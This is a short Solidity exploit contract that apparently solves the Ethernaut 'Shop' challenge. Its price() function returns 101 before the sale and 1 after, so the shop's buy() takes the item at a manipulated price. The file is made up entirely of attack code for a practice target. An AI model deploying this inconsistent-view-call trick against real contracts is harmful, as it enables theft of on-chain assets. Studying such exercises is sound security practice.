// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {

    Shop sTarget;
    
    function setTarget(address _target) external {
        sTarget = Shop(_target);
    }

    function exploit() external {
        sTarget.buy();
    }

    function price () external view returns (uint) {
        return sTarget.isSold() ? 1 : 101;
    }
}
